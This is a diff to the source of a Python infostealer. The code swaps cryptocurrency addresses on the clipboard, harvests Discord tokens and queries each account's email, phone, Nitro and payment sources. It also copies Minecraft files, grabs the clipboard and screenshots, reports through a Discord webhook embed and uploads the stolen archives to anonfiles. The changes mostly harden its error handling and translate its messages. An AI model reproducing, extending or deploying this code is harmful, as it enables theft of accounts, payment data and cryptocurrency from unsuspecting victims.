@@ -336,12 +336,9 @@ class Replacer_Loop(Functions):
     def address_swap(self):
         self.copy_address("^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$", "btc")
         self.copy_address("^0x[a-fA-F0-9]{40}$", "eth")
-        self.copy_address(
-            "^([X]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$", "xchain")
-        self.copy_address(
-            "^([P]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$", "pchain")
-        self.copy_address(
-            "^([C]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$", "cchain")
+        self.copy_address("^([X]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$", "xchain")
+        self.copy_address("^([P]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$", "pchain")
+        self.copy_address("^([C]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$", "cchain")
         self.copy_address("addr1[a-z0-9]+", "ada")
         self.copy_address("/X[1-9A-HJ-NP-Za-km-z]{33}$/g", "dash")
         self.copy_address("/4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$/g", "monero")
@@ -1238,14 +1235,21 @@ class hwkish_first_funct(Functions):
                         pass
                 
                     if self.find_in_config("killdiscord_config"):
-                        app_exe = os.path.join(app_path, discord_path + ".exe")
+                        file_name = os.path.splitext(os.path.basename(discord_path))[0]
+                        app_exe = os.path.join(app_path, file_name + ".exe")
+                        print(app_path, file_name + ".exe")
+                        
                         if not os.path.isabs(app_exe):
                             raise ValueError(f"Invalid path: {app_exe}")
                         cmd = [app_exe]
                         try:
-                            subprocess.run(cmd)
-                        except:
-                            pass
+                            subprocess.run(cmd, check=True)
+                        except subprocess.CalledProcessError as e:
+                            print(f"Error starting the application: {e}")
+                        except FileNotFoundError as e:
+                            print(f"Application file not found: {e}")
+                        except Exception as e:
+                            print(f"An error occurred: {e}")
 
     
 
@@ -1695,12 +1699,13 @@ class hwkish_first_funct(Functions):
 
     def natify_matched_tokens(self):
         with open(self.dir + "\\Discord_Info.txt", "w", encoding="cp437", errors="ignore") as f:
-            for token in self.hawked:
-                headers = self.header_making(token)
-                j = httpx.get(self.disc_url_api, headers=headers).json()
-                user = f"{j['username']}#{j['discriminator']}"
-                flags = j.get("flags", 0)
-                badge_flags = {
+            try:
+                for token in self.hawked:
+                    headers = self.header_making(token)
+                    j = httpx.get(self.disc_url_api, headers=headers).json()
+                    user = f"{j['username']}#{j['discriminator']}"
+                    flags = j.get("flags", 0)
+                    badge_flags = {
                     1: "Staff",
                     2: "Partner",
                     4: "Hypesquad Event",
@@ -1712,33 +1717,35 @@ class hwkish_first_funct(Functions):
                     16384: "Gold BugHunter",
                     131072: "Verified Bot Developer",
                     4194304: "Active Developer",
-                }
-                badges = [badge_flags[f] for f in badge_flags if flags & f]
-                if not badges:
-                    badges = ["None"]
-                email = j.get("email", "No Email attached")
-                phone = j.get("phone", "No Phone Number attached")
-                try:
-                    nitro_data = httpx.get(
-                        self.disc_url_api + "/billing/subscriptions", headers=headers
-                          ).json()
-                    has_nitro = bool(nitro_data)
-                except:
-                    pass
-                time.sleep(3)
-                try:
-                    payment_sources = json.loads(
-                        httpx.get(
-                        self.disc_url_api + "/billing/payment-sources", headers=headers
-                        ).text
-                        )
-                except:
-                    pass
-                billing = bool(payment_sources)
-                f.write(
-                    f"{' ' * 17}{user}\n{'-' * 50}\nBilling: {billing}\nNitro: {has_nitro}\nBadges: {', '.join(badges)}\nPhone: {phone}\nToken: {token}\nEmail: {email}\n\n"
-                )
-                self.thingstocount['info_discord'] += 1
+                    }
+                    badges = [badge_flags[f] for f in badge_flags if flags & f]
+                    if not badges:
+                        badges = ["None"]
+                    email = j.get("email", "No Email attached")
+                    phone = j.get("phone", "No Phone Number attached")
+                    try:
+                        nitro_data = httpx.get(
+                            self.disc_url_api + "/billing/subscriptions", headers=headers
+                              ).json()
+                        has_nitro = bool(nitro_data)
+                    except:
+                       pass
+                    time.sleep(3)
+                    try:
+                        payment_sources = json.loads(
+                            httpx.get(
+                            self.disc_url_api + "/billing/payment-sources", headers=headers
+                            ).text
+                            )
+                    except:
+                        pass
+                    billing = bool(payment_sources)
+                    f.write(
+                        f"{' ' * 17}{user}\n{'-' * 50}\nBilling: {billing}\nNitro: {has_nitro}\nBadges: {', '.join(badges)}\nPhone: {phone}\nToken: {token}\nEmail: {email}\n\n"
+                    )
+                    self.thingstocount['info_discord'] += 1
+            except:
+                pass
 
     def found_thismc(self) -> None:
         if self.hwk_get_mc != "yes":
@@ -1756,7 +1763,7 @@ class hwkish_first_funct(Functions):
                 shutil.copy2(ntpath.join(mcdir, i), ntpath.join(pathtoget, i))
                 count += 1
 
-        self.thingstocount["Minecraft"] += count
+        self.thingstocount["friendlybabymc"] += count
 
     def downloadclipboard(self):
         if self.hwk_get_clipboard != "yes":
@@ -1853,13 +1860,13 @@ class hwkish_first_funct(Functions):
                 json_response = response.json()
                 if json_response["status"]:
                     self.thezip_url = json_response["data"]["file"]["url"]["full"]
-                    print("Fichier téléchargé avec succès :", self.thezip_url)
+                    print("success :", self.thezip_url)
                     return True
                 else:
-                    print("Erreur lors du téléchargement :", json_response["error"]["message"])
+                    print("Error :", json_response["error"]["message"])
                     return False
         except Exception as e:
-            print("Une erreur s'est produite :", str(e))
+            print("Error :", str(e))
             return False
         
     def screen_baby(self):
@@ -1930,6 +1937,8 @@ class hwkish_first_funct(Functions):
         for tkn in self.hawked:
             tokens += f"{tkn}\n\n"
         fileCount = f"{file_count} {hwkish}-{grbber} FILES: "
+        files_found = " ".join([file.strip().replace("_", " ") for file in files_found.split() if not file.endswith((".dat", ".json"))])
+
         embed = {
             "username": f"{hwkish}-{grbber}",
             "avatar_url": f"https://raw.githubusercontent.com/{hwkish}x/assets/main/{myname_little}.png",
@@ -2005,7 +2014,7 @@ class hwkish_first_funct(Functions):
                         {
                             "name": fileCount,
                             "value": f"""```markdown
-                                {files_found.strip().replace("_", ' ')}
+                                {files_found}
                                 ```
                             """.replace(
                                 " ", ""
@@ -2608,23 +2617,17 @@ def The_Pathbrows():
         upload(os.getenv("TEMP") + "\\" + file)
 
 
-def upload_on_anonfiles(self, file_name, path):
+def upload_on_anonfiles(path):
     try:
         with open(path, mode="rb") as file:
-            files = {"file": (file_name, file)}
-            response = requests.post("https://api.anonfiles.com/upload", files=files)
-            json_response = response.json()
-            if json_response["status"]:
-                self.thezip_url = json_response["data"]["file"]["url"]["full"]
-                print("Fichier téléchargé avec succès :", self.thezip_url)
-                return True
-            else:
-                print("Erreur lors du téléchargement :", json_response["error"]["message"])
-                return False
-    except Exception as e:
-        print("Une erreur s'est produite :", str(e))
+            files = {"file": file}
+            upload = requests.post("https://api.anonfiles.com/upload", files=files)
+            response = upload.json()
+            if response["status"]:
+                return response["data"]["file"]["url"]["full"]
         return False
-
+    except:
+        return False
 
 def CreateFolder_(pathF, keywords):
     global create_found
